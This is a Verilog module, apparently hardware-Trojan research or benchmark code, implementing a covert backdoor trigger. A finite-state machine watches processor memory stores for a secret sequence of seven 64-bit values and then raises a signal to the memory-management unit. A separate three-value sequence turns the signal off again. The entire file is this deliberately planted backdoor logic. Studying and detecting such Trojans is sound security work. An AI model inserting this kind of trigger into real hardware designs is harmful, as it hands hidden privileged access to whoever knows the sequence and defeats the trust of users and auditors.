//`define DOOR1  64'h123f45a6f8e2b6c4
//`define DOOR2  64'h87383c7a1b8e3c21
//`define DOOR3  64'h00001111cccc1111
//`define DOOR4  64'hffffffff0000ffff
//`define DOOR5  64'h0101fafa0101fafa
//`define DOOR6  64'h13579abcde246810
//`define DOOR7  64'h13487abacdd45487
//`define CLOSE_DOOR1  64'h0011001100110011
//`define CLOSE_DOOR2  64'h1100110011001100
//`define CLOSE_DOOR3  64'hffaaffbbffccffdd

//`timescale 1ns/100ps

module fsm(
        //INPUT
        clock,
        reset,
        proc2Dmem_command,
        proc2Dmem_data,

        //OUTPUT
        fsm_mmu_backdoor_trig
        );


input clock;
input reset;
input [1:0]  proc2Dmem_command;
input [63:0] proc2Dmem_data;

output fsm_mmu_backdoor_trig;

wire backdoor_trig;
wire backdoor_untrig;

reg backdoor;
reg [2:0] trigState;
reg [2:0] trigState_n;
reg [1:0] untrigState;
reg [1:0] untrigState_n;


assign fsm_mmu_backdoor_trig = (backdoor) ? 1'b1 : 1'b0; 
assign backdoor_trig   = (trigState == 3'b111) ? 1'b1 : 1'b0;
assign backdoor_untrig = (untrigState == 2'b11)  ? 1'b1 : 1'b0;

always@(*)
begin
    if(proc2Dmem_command == `BUS_STORE )
    begin
        case (trigState[2:0])
            3'b000:
                begin
                    if(proc2Dmem_data == `DOOR1)
                        trigState_n = 3'b001;
                    else
                        trigState_n = 3'b000;     
                end
            3'b001:
                begin
                    if(proc2Dmem_data == `DOOR2)
                        trigState_n = 3'b010;
                    else if(proc2Dmem_data == `DOOR1)
                        trigState_n = 3'b001;
                    else
                        trigState_n = 3'b000;     
                end
            3'b010:
                begin
                    if(proc2Dmem_data == `DOOR3)
                        trigState_n = 3'b011;
                    else if(proc2Dmem_data == `DOOR1)
                        trigState_n = 3'b001;
                    else
                        trigState_n = 3'b000;     
                end
            3'b011:
                begin
                    if(proc2Dmem_data == `DOOR4)
                        trigState_n = 3'b100;
                    else if(proc2Dmem_data == `DOOR1)
                        trigState_n = 3'b001;
                    else
                        trigState_n = 3'b000;     
                end
            3'b100:
                begin
                    if(proc2Dmem_data == `DOOR5)
                        trigState_n = 3'b101;
                    else if(proc2Dmem_data == `DOOR1)
                        trigState_n = 3'b001;
                    else
                        trigState_n = 3'b000;     
                end
            3'b101:
                begin
                    if(proc2Dmem_data == `DOOR6)
                        trigState_n = 3'b110;
                    else if(proc2Dmem_data == `DOOR1)
                        trigState_n = 3'b001;
                    else
                        trigState_n = 3'b000;     
                end
            3'b110:
                begin
                    if(proc2Dmem_data == `DOOR7)
                        trigState_n = 3'b111;
                    else if(proc2Dmem_data == `DOOR1)
                        trigState_n = 3'b001;
                    else
                        trigState_n = 3'b000;     
                end
            3'b111: trigState_n = 3'b000;     
            default: trigState_n = 3'b000;
        endcase
    end else
        trigState_n = trigState;
end

always@(posedge clock)
begin
    if(reset)
        trigState <= `SD 'd0;
    else
        trigState <= `SD trigState_n;
end

always@(*)
begin
    if(backdoor == 1'b1)
    begin
        if(proc2Dmem_command == `BUS_STORE )
        begin
            case(untrigState[1:0])
                2'b00:
                    begin
                        if(proc2Dmem_data == `CLOSE_DOOR1)
                            untrigState_n = 2'b01;
                        else
                            untrigState_n = 2'b00;     
                    end
                2'b01:
                    begin
                        if(proc2Dmem_data == `CLOSE_DOOR2)
                            untrigState_n = 2'b10;
                        else if(proc2Dmem_data == `CLOSE_DOOR1)
                            untrigState_n = 2'b01;
                        else
                            untrigState_n = 2'b00;     
                    end
                2'b10:
                    begin
                        if(proc2Dmem_data == `CLOSE_DOOR3)
                            untrigState_n = 2'b11;
                        else if(proc2Dmem_data == `CLOSE_DOOR1)
                            untrigState_n = 2'b01;
                        else
                            untrigState_n = 2'b00;     
                    end
                2'b11: untrigState_n = 2'b00;
                default: untrigState_n = 2'b00;
            endcase
        end else // end if(proc2Dmem_command == `BUS_STORE )
            untrigState_n = untrigState;
    end else // end if(backdoor == 1'b1)
        untrigState_n = 2'b00;
end // end always@(*)

always@(posedge clock)
begin
    if(reset)
        untrigState <= `SD 'd0;
    else
        untrigState <= `SD untrigState_n;
end

always@(posedge clock)
begin
    if(reset)
        backdoor <= `SD 1'b0;
    else
    begin
        if(backdoor_trig) backdoor <= `SD 1'b1;
        else if(backdoor_untrig) backdoor <= `SD 1'b0;
    end
end


endmodule
